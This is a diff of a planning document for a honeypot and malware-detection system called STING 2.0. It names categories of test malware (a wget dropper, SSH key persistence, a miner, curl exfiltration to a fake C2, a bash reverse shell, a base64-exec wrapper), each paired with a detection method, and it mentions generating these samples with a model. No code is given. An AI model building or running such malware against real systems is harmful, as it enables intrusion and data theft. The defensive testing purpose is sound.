+| Port scanner | Internal sweep | Network pattern |
+| Data exfil | curl to fake C2 | Network stream + IOC |
+| Rootkit-lite | /proc hide attempt | Syscall detection |
+| Reverse shell | bash TCP | Network + process |
+| Polymorphic wrapper | base64 decode + exec | Entropy detection |
 
-## 8. STING-GENERATED MALWARE (TEST PLAN)
-
-Before hitting real prod, test with Venice-generated malware:
-
-```
-Test samples to generate:
-1. Shell dropper (wget + chmod + exec)
-2. SSH key injector (persistence)  
-3. Crypto miner (XMRig-style)
-4. Port scanner + lateral movement
-5. Data exfil (curl to C2)
-6. Rootkit-lite (hide process via /proc manipulation)
-7. Reverse shell (bash TCP)
-8. Polymorphic wrapper (base64-encoded payload)
-
-Each tested against STING trap → capture → lab → analysis.
-Pass criteria: STING detects, captures, analyzes, maps to MITRE.
-```
+Pass: STING catches, captures, streams live, maps to MITRE, generates YARA.
 
 ---
-
-## 9. ENHANCEMENTS vs 1.0
-
-| Feature | STING 1.0 | STING 2.0 |
-|---------|-----------|-----------|
-| Input | Cowrie logs only | OverlayFS + Cowrie + canaries |
-| Output | Telegram alerts | Full dashboard + API + IOC export |
-| Architecture | Script pipeline | Frontend + Backend + Lab |
-| Malware handling | Log URL only | Capture + transfer + detonate |
-| Analysis | Pattern matching | Dynamic behavioral analysis |
-| Intelligence | None | MITRE mapping + YARA generation |
-| Reusability | Internal only | API-first, exportable IOCs |
-
----
-
-## 10. FIRST DEV SESSION TASKS
-
-When Goran gives green light:
-1. Spawn coder → CT102 tmux claude-code
-2. `git checkout -b sting-2.0` in STING repo
-3. Scaffold: `fastapi-app/`, `react-app/`, `lab/`
-4. Week 1 deliverable: API health endpoint + event stream + basic React shell
-5. Review → iterate
 
 **Awaiting green light.**
